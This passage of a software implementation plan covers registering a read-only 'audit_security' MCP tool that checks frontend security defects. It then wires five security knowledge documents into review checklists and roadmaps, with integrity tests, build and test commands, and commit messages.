  "Audit a web project or snippet for security defects a frontend actually ships: missing or weak Content-Security-Policy, absent HSTS, unpinned cross-origin scripts, mixed content, credentials in localStorage, secret-named NEXT_PUBLIC_/VITE_ variables, unsandboxed third-party iframes, wildcard postMessage, raw-HTML sinks with no sanitiser, production source maps and un-ignored .env files. Header state is inferred from next.config / vercel.json / netlify.toml / _headers / middleware, read as text and never evaluated — this makes no network request, so it also reports what it could not see. Pair with audit_project for design drift and audit_accessibility for WCAG.",
  {
    path: z.string().optional().describe("Directory to audit. Absolute paths are strongly preferred. Required for configuration and header rules — a snippet cannot show them."),
    code: z.string().optional().describe("A single snippet to audit instead of a directory. Source rules only."),
    filename: z.string().optional().describe("Filename for the snippet, e.g. 'page.html' or 'Page.tsx'. Some rules depend on it: an inline onclick is a defect in HTML and normal JSX in a .tsx file."),
  },
  async ({ path, code, filename }) => {
    if (!path && !code) {
      return text("Pass `path` for a project audit, or `code` for a single snippet. A project audit is the useful one — header and CSP rules need configuration files.");
    }
    if (path) {
      const abs = isAbsolute(path) ? path : resolve(process.cwd(), path);
      let stat;
      try {
        stat = statSync(abs);
      } catch {
        return text(`There is no directory at \`${abs}\`. Pass an absolute path to the folder you want audited.`);
      }
      if (!stat.isDirectory()) {
        return text(`\`${abs}\` is a file, not a directory. Pass its parent folder, or use \`code\` for a single snippet.`);
      }
      return text(securityReport({ root: abs }));
    }
    return text(securityReport({ source: code, filename }));
  },
);
```

No annotations argument is needed: the `tool()` wrapper applies `READONLY_ANNOTATIONS` (`src/index.ts:107`) to every tool it registers, and `server.test.ts` asserts `readOnlyHint === true` and `openWorldHint === false` for all of them. Registering through the wrapper is what satisfies that.

- [ ] **Step 5: Run the full suite**

```bash
npm test
```

Expected: PASS, all 335+ cases.

- [ ] **Step 6: Verify the tool is really reachable**

```bash
npx @modelcontextprotocol/inspector node dist/index.js
```

Confirm `audit_security` appears in the tool list, then run it against this repo's own root and read the output. Auditing our own repository is the honest first test: if it reports something absurd about a project we know well, the rule is wrong.

- [ ] **Step 7: Commit**

```bash
git add src/security.ts src/index.ts tests/
git commit -m "feat: add the audit_security tool

Assembles the source and configuration rules into a report that always
states what it could not see — CDN and proxy headers, request-dependent
runtime logic, anything behind a variable.

project.ts already held that a truncated audit which looks complete is
worse than one that names what it skipped. Security raises the stakes:
a clean bill of health from an audit that could not read the relevant
file is not neutral, it is harmful."
```

---

### Task 10: Wire the documents into the orchestration surfaces

**Files:**
- Modify: `README.md`, `CHANGELOG.md`, and any `src/catalog.ts` wiring Tasks 1-5 did not already do
- Test: `tests/integrity.test.ts`

**Interfaces:**
- Consumes: all five doc ids from Tasks 1-5, the tool from Task 9.
- Produces: nothing new; this verifies the loop is closed and updates the public-facing counts.

**Scope correction, discovered during Task 1.** `tests/integrity.test.ts:131` asserts that no knowledge document is orphaned from every checklist and roadmap — exempting only `seo`, `geo` and design-language docs. A new `security` document therefore **cannot be committed unwired**: its own task must add it to `REVIEW_MAP`/`ROADMAPS` or the suite fails. Tasks 1-5 each do their own wiring as a result, and this task verifies the total rather than performing it.

That test is doing exactly its job — it is the check added after v0.14.0, where roadmaps referenced docs by ids that did not exist and those docs silently vanished from every checklist.

**`REVIEW_MAP` has five keys**, not three: `mobile-app`, `macos-app`, `website`, `landing-page`, `dashboard`. `website` and `dashboard` are written as bare identifiers rather than quoted strings, so a grep for `"key":` misses them. `ROADMAPS` has six: `website`, `landing-page`, `ios-app`, `android-app`, `macos-app`, `saas-web-app`.

- [ ] **Step 1: Write the failing test**

Add to `tests/integrity.test.ts`:

The orphan test already guarantees each document is referenced *somewhere*. What it cannot guarantee is that the web-facing surfaces carry security at all — every security doc could be parked on `mobile-app` and the test would pass. This asserts the intent:

```ts
describe("security documents are reachable from the workflows", () => {
  it("puts security in every web-facing review checklist", () => {
    for (const key of ["website", "landing-page", "dashboard"]) {
      const list = REVIEW_MAP[key] ?? [];
      const hasSecurity = list.some((id) => docs.find((d) => d.id === id)?.category === "security");
      expect(`${key}:${hasSecurity}`).toBe(`${key}:true`);
    }
  });

  it("puts security in every web-facing roadmap", () => {
    for (const key of ["website", "landing-page", "saas-web-app"]) {
      const ids = (ROADMAPS[key]?.phases ?? []).flatMap((p) => p.docs);
      const hasSecurity = ids.some((id) => docs.find((d) => d.id === id)?.category === "security");
      expect(`${key}:${hasSecurity}`).toBe(`${key}:true`);
    }
  });

  it("references all five security documents, not just the one that satisfies the orphan check", () => {
    const referenced = new Set<string>();
    for (const list of Object.values(REVIEW_MAP)) list.forEach((id) => referenced.add(id));
    for (const rm of Object.values(ROADMAPS)) {
      rm.fullGuides.forEach((id) => referenced.add(id));
      rm.phases.forEach((p) => p.docs.forEach((id) => referenced.add(id)));
    }
    const unreferenced = docs
      .filter((d) => d.category === "security" && !referenced.has(d.id))
      .map((d) => d.id);
    expect(unreferenced).toEqual([]);
  });
});
```

`Roadmap` carries `fullGuides` and `phases` (each phase `{ title, goal, docs }`) — confirmed against `src/catalog.ts`.

- [ ] **Step 2: Run to verify it fails**

```bash
npm run build && npx vitest run tests/integrity.test.ts
```

Expected: FAIL — no security doc in those lists.

- [ ] **Step 3: Wire them in**

Tasks 1-5 each wired their own document (the orphan test forced it). Read the current `REVIEW_MAP` and `ROADMAPS`, then add only what the three tests above still find missing. The intended placement, for reference:

| Document | `REVIEW_MAP` | `ROADMAPS` |
|---|---|---|
| `web-security-headers` | `website`, `dashboard` | `website` p5, `saas-web-app` p5 |
| `frontend-attack-surface` | `website`, `dashboard` | `website` p5, `saas-web-app` p5 |
| `auth-and-session-ux` | `dashboard` | `saas-web-app` |
| `privacy-consent-and-tracking` | `website`, `landing-page` | `website` |
| `ai-feature-security` | `dashboard`, `mobile-app` | `saas-web-app` |

`auth-and-session-ux` belongs to `dashboard`/`saas-web-app` rather than `website` — a marketing site rarely has sessions, and padding a checklist with documents that do not apply to it is how checklists stop being read.

`integrity.test.ts` already asserts that every id referenced from `catalog.ts` exists in the knowledge base — the check added after v0.14.0, where roadmaps named docs that did not exist. A typo here fails the suite rather than silently orphaning a document.

- [ ] **Step 4: Update README and CHANGELOG**

README: the summary line at the top (`88 curated knowledge documents · 29 tools`) becomes 93 and 30. Add a `🔒 **Security**` row to the "What's inside" table describing the five documents. Add `audit_security` to the tools section in the style of its neighbours.

CHANGELOG: a new `## [0.20.0] — 2026-08-12` section with `### Added`, written in the voice of the existing entries — lead with the problem, not the feature. The 88-documents-and-not-one-mention-of-CSP fact is the opening line.

- [ ] **Step 5: Run the full suite and the release preflight**

```bash
npm test && npm run preflight
```

Expected: PASS both. The preflight checks packaging — confirm `knowledge/security/**` is included by the `files` array in `package.json` (it ships `knowledge`, so it should be, but verify rather than assume).

- [ ] **Step 6: Commit**

```bash
git add src/catalog.ts README.md CHANGELOG.md tests/integrity.test.ts
git commit -m "feat: wire the security documents into the review checklists and roadmaps

A document nothing references is a document nobody reads. The web review
checklists and roadmaps now carry the security docs, and an integrity
test asserts the wiring so a future doc cannot be added and silently
orphaned — the failure mode that hid pattern docs in v0.14.0."
```

---

## Self-Review

**Spec coverage.** Every spec section maps to a task: the five documents to Tasks 1-5 (each with real frontmatter and required claims); `audit_security` source rules to Task 7 and configuration rules to Task 8; the report and its "not visible" section to Task 9; the `scanTags` export and `scanProject` filename matching to Task 6; category registration to Task 1; the source-policy allowlist test to Task 1; the README/CHANGELOG/REVIEW_MAP wiring to Task 10.

**Deliberate omission carried forward.** `audit_project` integration remains out of scope, per the spec. It is a follow-up once the rules are proven against real projects.

**Known soft spot.** `extractHeaders` handles four configuration shapes with regular expressions rather than a parser. This is a deliberate trade — no new dependency, and configuration is never evaluated — but it is the part most likely to need widening when it meets a real project. Task 9 Step 6 exists for exactly that: run it against this repository before believing it.

**Type consistency.** `LintFinding` is used unchanged throughout. `scanProject(root, extensions?, filenames?)` is called with all three arguments only in Task 9. `securitySourceRules(code, filename?)` and `securityConfigRules(files)` keep the same signatures from Task 7 onward.
